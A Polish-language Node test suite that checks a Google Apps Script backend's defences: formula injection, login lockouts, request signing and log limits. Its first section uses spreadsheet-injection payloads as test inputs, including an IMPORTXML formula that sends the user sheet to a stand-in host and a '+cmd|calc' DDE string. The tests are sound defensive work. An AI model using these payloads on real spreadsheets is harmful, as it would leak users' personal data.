// Backend Apps Script (apps_script_POPRAWIONY_v2.gs) uruchomiony w Node na atrapach usług Google — TEN SAM plik, który wklejasz do Apps Script.
// Sprawdza: formuły z danych klienta nie trafiają do arkusza (=IMPORTXML… wysłałoby arkusz pod obcy adres), limity zgadywania haseł, brak zakładania kont przez puls,
// rejestr sesji tylko dla istniejących kont, limity dzienników, podpis obowiązkowy oraz że zwykłe przepływy (logowanie, zmiana hasła, reset, puls) nadal działają.
// NODE_PATH nie jest potrzebny:  node testy/backend_gs_test.js   (plik .gs leży w katalogu głównym repozytorium, poza paczką web — bez niego test się pomija)
const { zaladuj, istnieje } = require('./backend_gs_atrapa');
if (!istnieje()) { console.log('  POMINIĘTO — brak apps_script_POPRAWIONY_v2.gs obok katalogu web (test działa tylko w całym repozytorium)'); process.exit(0); }
let kod = 0; const ok = (opis, w, szcz = '') => { console.log((w ? '  OK   ' : '  BŁĄD ') + opis + (szcz ? ' — ' + szcz : '')); if (!w) kod = 1; };
const swiezy = (o) => { const B = zaladuj(o); B.dodajUzytkownika('12345', 'Jan Testowy', 'mazowieckie', '2099-12-31', '600 100 200', 'haslo123'); B.dodajUzytkownika('22222', 'Anna Nowa', 'slaskie', '2099-12-31', '501502503', ''); B.dodajUzytkownika('33333', 'Ewa Wygasla', '', '2020-01-01', '700800900', 'haslo123'); return B; };
const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';

/* ---- 1. formuły ---- */
{
  const B = swiezy();
  B.post({ akcja: 'puls', kod: '12345', system: F, wersja: F }, { haslo: 'haslo123' });
  B.post({ akcja: 'sesja', kod: '12345', rodzaj: F, wersja: '+cmd|calc' }, { haslo: 'haslo123' });
  B.post({ akcja: 'sesja', kod: F, rodzaj: F });
  B.post({ akcja: 'reset_hasla', kod: F, telefon: '1' });
  B.post({ akcja: 'zmien_haslo', kod: F, stare_haslo: 'x', nowe_haslo: 'abcdefg' });
  B.post({ akcja: 'logowanie', kod: F, haslo: 'x' });
  B.post({ akcja: 'logowanie', kod: '12345', haslo: 'x', zrodlo: F });
  B.post({ akcja: F, kod: '12345' });
  B.post({ akcja: 'puls', kod: '12345', system: '@SUM(1)', wersja: '-2+3' }, { haslo: 'haslo123' });
  B.post({ akcja: 'puls', kod: '12345', system: '\t=1+1' }, { haslo: 'haslo123' });
  ok('żadne pole od klienta nie trafia do arkusza jako formuła (puls, sesja, reset, zmiana hasła, logowanie, dziennik)', B.formuly().length === 0, JSON.stringify(B.formuly()));
  const s = B.get('Uzytkownicy').w[1];
  ok('tekst z formułą zostaje w arkuszu jako zwykły tekst (z apostrofem), a nie znika', String(s[6]).startsWith("'") || s[6] === '', String(s[6]).slice(0, 30));
}
/* ---- 2. puls i konta ---- */
{
  const B = swiezy();
  const przed = B.get('Uzytkownicy').getLastRow();
  const o = B.post({ akcja: 'puls', kod: '99999' });
  ok('puls z nieznanego kodu NIE zakłada konta', B.get('Uzytkownicy').getLastRow() === przed && o.status === 'zly_kod', JSON.stringify(o));
  for (let i = 10000; i < 10300; i++) B.post({ akcja: 'puls', kod: String(i) });
  ok('300 pulsów z wymyślonych kodów nie zasypuje arkusza', B.get('Uzytkownicy').getLastRow() === przed, String(B.get('Uzytkownicy').getLastRow()));
  const p = B.post({ akcja: 'puls', kod: '12345', uruchomienia: 1, dokumenty: 7, minuty: 20, system: 'Web' }, { haslo: 'haslo123' });
  ok('puls znanego konta działa jak dotąd (status, imię, rejon, ważność)', p.status === 'ok' && p.imie === 'Jan Testowy' && p.rejon === 'mazowieckie' && p.wazne_do === '2099-12-31', JSON.stringify(p));
  const w = B.get('Uzytkownicy').w[1];
  ok('statystyki pulsu doliczone', w[7] === 1 && w[8] === 7 && w[9] === 20 && w[6] === 'Web', JSON.stringify(w.slice(5, 10)));
  B.post({ akcja: 'puls', kod: '12345', uruchomienia: 9e9, dokumenty: -5, minuty: 'abc' }, { haslo: 'haslo123' });
  const w2 = B.get('Uzytkownicy').w[1];
  ok('przyrosty z pulsu mają granice (9e9 → 1000, ujemne i śmieci → 0)', w2[7] === 1001 && w2[8] === 7 && w2[9] === 20, JSON.stringify(w2.slice(7, 10)));
  ok('puls konta wygasłego mówi „wygasla” (także bez hasła — stare programy muszą to wiedzieć)', B.post({ akcja: 'puls', kod: '33333' }).status === 'wygasla' && B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).status === 'wygasla');
  const sPrzed = B.get('Sesje').getLastRow();
  B.post({ akcja: 'sesja', kod: '77777', rodzaj: 'logowanie' }); B.post({ akcja: 'sesja', kod: 'xx', rodzaj: 'logowanie' });
  ok('rejestr sesji nie przyjmuje wpisów dla nieistniejących kont', B.get('Sesje').getLastRow() === sPrzed);
  B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' });
  ok('rejestr sesji przyjmuje wpis istniejącego konta z podpisem hasłem', B.get('Sesje').getLastRow() === sPrzed + 1 && B.get('Sesje').w[sPrzed][2] === 'Jan Testowy');
}
/* ---- 3. limity zgadywania ---- */
{
  const B = swiezy(); let wyniki = [];
  for (let i = 0; i < 12; i++) wyniki.push(B.post({ akcja: 'logowanie', kod: '12345', haslo: 'zle' + i }).opis);
  const zablok = wyniki.findIndex(o => /Za duzo nieudanych/.test(o));
  ok('po 8 nieudanych próbach logowanie jest blokowane', zablok === 8, 'pierwsza blokada przy próbie nr ' + (zablok + 1));
  ok('zablokowane konto odrzuca też DOBRE hasło (inaczej limit nic by nie dawał)', /Za duzo nieudanych/.test(B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).opis || ''));
  ok('zmiana hasła przez zgadywanie „dotychczasowego” jest tak samo blokowana', /Za duzo nieudanych/.test(B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: 'haslo123', nowe_haslo: 'innehaslo1' }).opis || ''));
  ok('inne konto nie jest dotknięte blokadą', B.post({ akcja: 'logowanie', kod: '22222', haslo: '501502503' }).status === 'ok');
  B.dalej(16 * 60 * 1000);
  ok('po 15 minutach blokada krótkiego okna mija i dobre hasło wchodzi', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok');
  ok('udane logowanie zeruje liczniki', (() => { for (let i = 0; i < 7; i++) B.post({ akcja: 'logowanie', kod: '12345', haslo: 'x' + i }); return B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok'; })());
  // długie okno: 25 prób w 6 godzin, nawet rozłożonych tak, by krótkie okno nie zadziałało
  const C = swiezy(); let kiedy = null;
  for (let i = 0; i < 40; i++) { const o = C.post({ akcja: 'logowanie', kod: '12345', haslo: 'z' + i }); if (/Za duzo/.test(o.opis) && kiedy === null) kiedy = i; if (i % 7 === 6) C.dalej(16 * 60 * 1000); }
  ok('długie okno: ~25 prób w 6 h blokuje także przy ostrożnym zgadywaniu (7 prób, pauza 16 min)', kiedy !== null && kiedy <= 30, 'blokada od próby ' + (kiedy === null ? '—' : kiedy + 1));
  const D = swiezy(); for (let i = 0; i < 9; i++) D.post({ akcja: 'logowanie', kod: '12345', haslo: 'x' + i });
  ok('„Nie pamiętam hasła” (telefon z kartoteki) odblokowuje konto', D.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600100200' }).status === 'ok'
    && D.post({ akcja: 'logowanie', kod: '12345', haslo: '600100200' }).status === 'ok');
  const E = swiezy(); const a = []; for (let i = 0; i < 8; i++) a.push(E.post({ akcja: 'logowanie', kod: String(40000 + i), haslo: 'cokolwiek' }).opis);
  ok('zgadywanie RÓŻNYCH kodów nie blokuje nikogo (limit jest na kod)', a.every(x => /Nie znaleziono/.test(x)) && E.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok');
}
/* ---- 4. zwykłe przepływy ---- */
{
  const B = swiezy();
  ok('logowanie hasłem', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).imie === 'Jan Testowy');
  ok('konto z hasłem nie wpuszcza telefonem', /ustawione haslo/.test(B.post({ akcja: 'logowanie', kod: '12345', haslo: '600100200' }).opis));
  ok('konto bez hasła wpuszcza telefonem', B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).status === 'ok');
  ok('logowanie mówi, czym weszło (klient zakłada sejf tą samą postacią hasła)', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).przez === 'haslo' && B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).przez === 'telefon');
  ok('każda odpowiedź, także odmowa, niesie czas serwera (poprawka zegara urządzenia)', [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }), B.post({ akcja: 'nieznana', kod: '12345' }), B.post({ akcja: 'puls', kod: '12345' })].every(o => Math.abs(o.czas_serwera - Date.now() / 1000) < 5));
  ok('ustawienie własnego hasła telefonem (konto bez hasha)', B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'mojehaslo9' }).status === 'ok' && B.post({ akcja: 'logowanie', kod: '22222', haslo: 'mojehaslo9' }).status === 'ok');
  ok('zmiana hasła dotychczasowym hasłem', B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: 'haslo123', nowe_haslo: 'nowehaslo1' }).status === 'ok' && B.post({ akcja: 'logowanie', kod: '12345', haslo: 'nowehaslo1' }).status === 'ok');
  ok('telefon nie podmienia hasła na koncie, które je ma', B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: '600100200', nowe_haslo: 'przejete123' }).status === 'blad');
  ok('kod spoza 5 cyfr odrzucony we wszystkich akcjach', ['logowanie', 'zmien_haslo', 'reset_hasla'].every(a => B.post({ akcja: a, kod: '12a45', haslo: 'x', stare_haslo: 'x', nowe_haslo: 'abcdefg', telefon: '600100200' }).status === 'blad'));
  ok('nieznana akcja i śmieciowe zapytanie nie wywracają backendu', B.post({ akcja: 'cokolwiek' }).status === 'blad' && B.post('nie-json', {}).status === 'blad' && B.post('[1,2]', {}).status === 'blad' && B.post('null', {}).status === 'blad');
  ok('błąd serwera nie zdradza szczegółów skryptu klientowi', !/at |TypeError|ReferenceError|Uzytkownicy/.test(JSON.stringify(B.post('{"akcja":"puls","kod":{"toString":1}}', {}))));
  ok('za duże zapytanie odrzucone', /duze/.test(B.post(JSON.stringify({ akcja: 'puls', kod: '12345', x: 'a'.repeat(30000) }), {}).opis));
}
/* ---- 5. limit dzienników ---- */
{
  const B = swiezy({ ustaw: 'WPISOW_NA_GODZINE = 50;' });
  for (let i = 0; i < 400; i++) B.post({ akcja: 'reset_hasla', kod: '1234' + (i % 10), telefon: '1' });
  for (let i = 0; i < 400; i++) B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' });
  const wpisow = (B.get('Log') ? B.get('Log').getLastRow() : 0) + (B.get('Sesje') ? B.get('Sesje').getLastRow() : 0) - 2;
  ok('dzienniki mają limit wpisów na godzinę (800 zapytań → nie więcej niż limit)', wpisow <= 52, 'wpisów: ' + wpisow);
  B.dalej(3601 * 1000); const przed = B.get('Sesje').getLastRow(); B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'wylogowanie' }, { haslo: 'haslo123' });
  ok('po godzinie dzienniki znów przyjmują wpisy', B.get('Sesje').getLastRow() === przed + 1);
}
/* ---- 6. podpis ---- */
{
  const B = swiezy({ podpisObowiazkowy: true });
  ok('przy PODPIS_OBOWIAZKOWY brak podpisu = odmowa', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }, { bezPodpisu: true }).opis === 'odmowa');
  ok('przy PODPIS_OBOWIAZKOWY podpisane zapytanie przechodzi', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok');
}
/* ---- 7. puls i sesja wymagają hasła (podpis kluczem pochodnym od hasła) ---- */
{
  const B = swiezy();
  B.get('Nieobecnosci').appendRow(['12345', new B.ctx.Date('2099-01-01'), new B.ctx.Date('2099-01-10'), 'L4', '', '']);
  const kodTylko = B.post({ akcja: 'puls', kod: '12345' });      // ktoś zna sam 5-cyfrowy kod
  ok('puls z samym kodem NIE zdradza imienia, rejonu ani L4 (zostaje status i data ważności)', kodTylko.status === 'ok' && kodTylko.imie === '' && kodTylko.rejon === '' && kodTylko.nieobecnosci.length === 0 && kodTylko.wazne_do === '2099-12-31' && kodTylko.pelne === false, JSON.stringify(kodTylko));
  ok('puls z samym kodem niczego nie zmienia w arkuszu (ani statystyk, ani „ostatniego kontaktu”)', (() => { B.post({ akcja: 'puls', kod: '12345', uruchomienia: 5, dokumenty: 5, minuty: 5, system: 'Obcy' }); const w = B.get('Uzytkownicy').w[1]; return (w[7] || 0) === 0 && (w[8] || 0) === 0 && (w[6] || '') === '' && (w[4] || '') === ''; })());
  const zlyKlucz = B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'zlehaslo' });
  ok('puls podpisany ZŁYM hasłem — jak bez hasła', zlyKlucz.pelne === false && zlyKlucz.imie === '', JSON.stringify(zlyKlucz));
  const zHaslem = B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' });
  ok('puls podpisany hasłem oddaje komplet: imię, rejon, nieobecności', zHaslem.pelne === true && zHaslem.imie === 'Jan Testowy' && zHaslem.rejon === 'mazowieckie' && zHaslem.nieobecnosci.length === 1 && zHaslem.nieobecnosci[0].typ === 'L4', JSON.stringify(zHaslem).slice(0, 140));
  ok('puls podpisany hasłem zapisuje statystyki', (() => { B.post({ akcja: 'puls', kod: '12345', uruchomienia: 2, dokumenty: 3, minuty: 4, system: 'Web' }, { haslo: 'haslo123' }); const w = B.get('Uzytkownicy').w[1]; return w[7] === 2 && w[8] === 3 && w[9] === 4 && w[6] === 'Web'; })());
  ok('podpis hasłem jednego konta nie działa na innym (klucz zależy od loginu i hasła)', B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne === true && B.post({ akcja: 'puls', kod: '33333' }, { hashKlucza: B.hash('12345', 'haslo123') }).pelne === false);
  /* podpis przechwycony i podstawiony pod inne zapytanie / stary */
  const cz = B.wywolaj('Math.floor(Date.now()/1000)'); const kr = require('crypto');
  const podpisHasla = (kod, akcja, czas, klucz) => kr.createHmac('sha256', klucz).update(`${kod}|${akcja}|${czas}`).digest('hex');
  const stary = cz - 3600; const odp = B.post(JSON.stringify({ akcja: 'puls', kod: '12345', klucz_czas: stary, podpis_hasla: podpisHasla('12345', 'puls', stary, B.hash('12345', 'haslo123')) }), {});
  ok('podpis hasłem sprzed godziny (powtórka starego zapytania) jest odrzucany', odp.pelne === false, JSON.stringify(odp).slice(0, 80));
  const odp2 = B.post(JSON.stringify({ akcja: 'sesja', kod: '12345', klucz_czas: cz, podpis_hasla: podpisHasla('12345', 'puls', cz, B.hash('12345', 'haslo123')), rodzaj: 'logowanie' }), {});
  const sPrzed = (B.get('Sesje') || { getLastRow: () => 1 }).getLastRow();
  ok('podpis zrobiony dla akcji „puls” nie otwiera akcji „sesja” (podpis obejmuje akcję)', odp2.status === 'ok' && (B.get('Sesje') || { getLastRow: () => 1 }).getLastRow() === sPrzed);
  /* sesje */
  const S0 = B.get('Sesje').getLastRow();
  B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' });
  ok('wpis do rejestru sesji bez podpisu hasłem jest po cichu pomijany', B.get('Sesje').getLastRow() === S0);
  B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' });
  ok('wpis do rejestru sesji z podpisem hasłem przechodzi', B.get('Sesje').getLastRow() === S0 + 1);
  /* konto bez hasła i zmiana hasła */
  const bez = B.post({ akcja: 'puls', kod: '22222' }, { haslo: 'cokolwiek' });
  ok('konto bez ustawionego hasła nie ma klucza — puls zredukowany (najpierw trzeba ustawić hasło)', bez.pelne === false && bez.imie === '');
  B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'mojehaslo9' });
  ok('po ustawieniu hasła puls podpisany nowym hasłem oddaje komplet', B.post({ akcja: 'puls', kod: '22222' }, { haslo: 'mojehaslo9' }).imie === 'Anna Nowa');
  B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: 'haslo123', nowe_haslo: 'nowehaslo1' });
  ok('po zmianie hasła STARY klucz przestaje działać, nowy działa', B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === false && B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'nowehaslo1' }).pelne === true);
  B.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600100200' });
  ok('po resecie hasła (hash skasowany) klucz hasłem przestaje działać', B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'nowehaslo1' }).pelne === false);
  /* okres przejściowy */
  const T = swiezy({ ustaw: 'WYMAGAJ_HASLA_W_PULSIE = false;' });
  ok('WYMAGAJ_HASLA_W_PULSIE = false (przejście): puls bez podpisu hasłem działa jak dotąd, z kompletem', (() => { const o = T.post({ akcja: 'puls', kod: '12345' }); return o.imie === 'Jan Testowy' && o.pelne === true; })());
  const U = swiezy(); ok('domyślnie (po wdrożeniu) hasło jest wymagane', U.post({ akcja: 'puls', kod: '12345' }).imie === '');
}
/* ---- 7. hasło do paczek z dokumentami (nadaje administrator, z terminem ważności) ---- */
{
  const B = swiezy(); const H = { haslo: 'haslo123' };
  const ust = () => B.get('Ustawienia');
  const wpisz = (klucz, wartosc) => { const w = ust().w.find(r => r[0] === klucz); w[1] = wartosc; };
  ok('inicjalizuj() zakłada zakładkę „Ustawienia” z trzema pustymi wierszami: hasło paczki, data ważności i adres odbiorcy (administrator tylko wpisuje wartości)', ust() && ust().w[0].join() === 'Klucz,Wartosc,Opis' && ust().w.length === 4 && ust().w[1][0] === 'haslo_paczki' && ust().w[1][1] === '' && ust().w[2][0] === 'haslo_paczki_wazne_do' && ust().w[2][1] === '' && ust().w[3][0] === 'adres_odbiorcy' && ust().w[3][1] === '', JSON.stringify(ust() && ust().w.map(r => r.slice(0, 2))));
  ok('wiersze z opisami nie zaczynają się od znaków formuły (arkusz nie zrobi z nich formuły)', B.formuly().length === 0, JSON.stringify(B.formuly()));
  ok('nic nie ustawione → „brak” (wysyłka wyłączona), bez żadnego hasła w odpowiedzi', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return o.status === 'brak' && !('haslo' in o); })());
  wpisz('haslo_paczki', 'Tajne-Haslo-2026');
  ok('hasło bez daty ważności → „brak” (termin ważności jest obowiązkowy)', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return o.status === 'brak' && !('haslo' in o); })());
  wpisz('haslo_paczki_wazne_do', '2099-12-31');
  ok('hasło i termin, ale bez adresu odbiorcy → „brak” (wysyłka włączona dopiero, gdy wpisane są wszystkie trzy rzeczy), bez hasła w odpowiedzi', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return o.status === 'brak' && !('haslo' in o); })());
  for (const zly of ['nie-adres', 'a@b', 'a b@c.pl', '@x.pl']) { wpisz('adres_odbiorcy', zly); if (B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status !== 'brak') ok('niepoprawny adres odbiorcy „' + zly + '” jest odrzucany', false); }
  ok('niepoprawny adres odbiorcy (bez @, bez domeny, ze spacją) → „brak”', true);
  wpisz('adres_odbiorcy', 'odbiorca@firma.pl');
  const ok1 = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H);
  ok('hasło, termin w przyszłości i adres → „ok”, odpowiedź niesie hasło, datę ważności i adres odbiorcy', ok1.status === 'ok' && ok1.haslo === 'Tajne-Haslo-2026' && ok1.wazne_do === '2099-12-31' && ok1.adres === 'odbiorca@firma.pl', JSON.stringify(ok1));
  ok('konto, które jeszcze nie ustawiło własnego hasła (nie ma klucza), hasła paczki nie dostaje', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '22222' }, { haslo: '501502503' }); return o.status === 'odmowa' && !('haslo' in o); })());
  B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'mojehaslo9' });
  ok('…a drugie konto (po ustawieniu własnego hasła) dostaje identyczne hasło paczki', B.post({ akcja: 'haslo_paczki', kod: '22222' }, { haslo: 'mojehaslo9' }).haslo === 'Tajne-Haslo-2026');
  ok('wydanie hasła zostawia ślad w zakładce Log (kto pobrał)', B.get('Log').w.some(r => r[1] === '12345' && r[2] === 'haslo_paczki' && /2099-12-31/.test(r[3])));
  const odmowy = [['sam kod, bez podpisu hasłem', { akcja: 'haslo_paczki', kod: '12345' }, {}], ['zły podpis hasłem (inne hasło)', { akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'zle-haslo' }], ['nieznany kod', { akcja: 'haslo_paczki', kod: '99999' }, { haslo: 'haslo123' }], ['kod ze śmieciem', { akcja: 'haslo_paczki', kod: '12345; DROP' }, H], ['pusty kod', { akcja: 'haslo_paczki' }, H]];
  for (const [opis, d, o] of odmowy) { const r = B.post(d, o); ok(`odmowa bez hasła w odpowiedzi: ${opis}`, r.status === 'odmowa' && !('haslo' in r) && !JSON.stringify(r).includes('Tajne-Haslo'), JSON.stringify(r)); }
  ok('bez podpisu aplikacji (zapytanie spoza aplikacji) hasło też nie wychodzi, gdy podpis jest obowiązkowy', (() => { const S = swiezy({ podpisObowiazkowy: true }); const w = S.get('Ustawienia').w; w[1][1] = 'Tajne-Haslo-2026'; w[2][1] = '2099-12-31'; w[3][1] = 'odbiorca@firma.pl'; const r = S.post({ akcja: 'haslo_paczki', kod: '12345', klucz_czas: Math.floor(Date.now() / 1000) }, { bezPodpisu: true }); return r.status === 'blad' && !JSON.stringify(r).includes('Tajne-Haslo'); })());
  ok('konto z wygasłą sesją (kod 33333) → „wygasla”, bez hasła', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '33333' }, H); return r.status === 'wygasla' && !('haslo' in r); })());
  wpisz('haslo_paczki_wazne_do', '2020-01-01');
  ok('termin ważności hasła minął → „wygaslo” z datą, BEZ hasła (po terminie skrypt go nie wydaje)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'wygaslo' && r.wazne_do === '2020-01-01' && !('haslo' in r) && !JSON.stringify(r).includes('Tajne-Haslo'); })());
  const dzisIso = (() => { const d = new Date(B.wywolaj('Date.now()')), p = n => String(n).padStart(2, '0'); return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}`; })();
  wpisz('haslo_paczki_wazne_do', dzisIso);
  ok('ostatni dzień ważności to jeszcze dzień ważny (dziś włącznie)', B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status === 'ok', dzisIso);
  B.dalej(2 * 86400000);
  ok('dwa dni później to samo hasło jest już po terminie', B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status === 'wygaslo');
  wpisz('haslo_paczki', 'Nowe-Haslo-na-grudzien'); wpisz('haslo_paczki_wazne_do', '2099-01-31');
  ok('administrator wpisuje nowe hasło i nowy termin → od razu obowiązuje (bez zmian w aplikacji)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'ok' && r.haslo === 'Nowe-Haslo-na-grudzien' && r.wazne_do === '2099-01-31'; })());
  wpisz('haslo_paczki_wazne_do', new Date('2099-03-05T00:00:00')); wpisz('haslo_paczki', 123456789);
  ok('arkusz zamienia wpisaną datę na datę, a numeryczne hasło na liczbę — obie postacie działają (data → RRRR-MM-DD, liczba → tekst)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'ok' && r.haslo === '123456789' && r.wazne_do === '2099-03-05'; })());
  wpisz('haslo_paczki', '   ');
  ok('samo odstępy w polu hasła = wysyłka wyłączona („brak”)', B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status === 'brak');
  ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 4);
  ok('istniejąca zakładka „Ustawienia” bez wiersza adresu (ze starszej wersji skryptu) jest uzupełniona o ten wiersz przy następnym wywołaniu inicjalizuj()', (() => { const C = swiezy(); C.get('Ustawienia').w.pop(); C.wywolaj('inicjalizuj()'); return C.get('Ustawienia').w.length === 4 && C.get('Ustawienia').w[3][0] === 'adres_odbiorcy'; })());
}
/* ---- 9. podpis hasłem nie jest wyrocznią do zgadywania hasła bez limitu ---- */
{
  const B = swiezy(); let trafien = 0;
  B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
  const wpisyLog = () => B.get('Log').getLastRow();
  for (let i = 0; i < 59; i++) if (B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'kandydat' + i }).pelne) trafien++;
  ok('59 złych podpisów hasłem (np. stare hasło na drugim urządzeniu) — dobry podpis dalej przechodzi', trafien === 0 && B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
  const logPrzed = wpisyLog();
  for (let i = 0; i < 140; i++) B.post({ akcja: i % 2 ? 'puls' : 'haslo_paczki', kod: '12345' }, { haslo: 'kandydat-b' + i });
  const p = B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' });
  ok('po przekroczeniu limitu złych podpisów nawet trafione hasło nie daje „pelne” (wyrocznia zamknięta)', p.pelne === false && p.imie === '' && p.status === 'ok', JSON.stringify(p));
  ok('…haslo_paczki też odmawia (hasło paczki nie wychodzi)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'haslo123' }); return r.status === 'odmowa' && !('haslo' in r); })());
  ok('…a sesja nie dopisuje wpisu', (() => { const n = B.get('Sesje').getLastRow(); B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' }); return B.get('Sesje').getLastRow() === n; })());
  ok('zablokowanie podpisów hasłem zostawia JEDEN wpis w Log', B.get('Log').w.slice(1).filter(r => r[2] === 'podpis_hasla' && /ZABLOKOWANY/.test(r[3])).length === 1 && wpisyLog() > logPrzed);
  ok('limit dotyczy tylko tego kodu (inne konto pulsuje w pełni)', B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne === true);
  ok('złe podpisy hasłem nie blokują logowania (osobny licznik)', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok');
  ok('udane logowanie hasłem zdejmuje blokadę podpisów', B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true && B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'haslo123' }).status === 'ok');
  const C = swiezy();
  for (let i = 0; i < 80; i++) C.post({ akcja: 'puls', kod: '12345' });
  ok('puls bez podpisu hasłem (stary program) nie zużywa limitu', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
  for (let i = 0; i < 70; i++) C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'zle' + i });
  C.dalej(6 * 3600 * 1000 + 1000);
  ok('po 6 godzinach (koniec okna) dobry podpis znów przechodzi bez logowania', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
}
process.exit(kod);
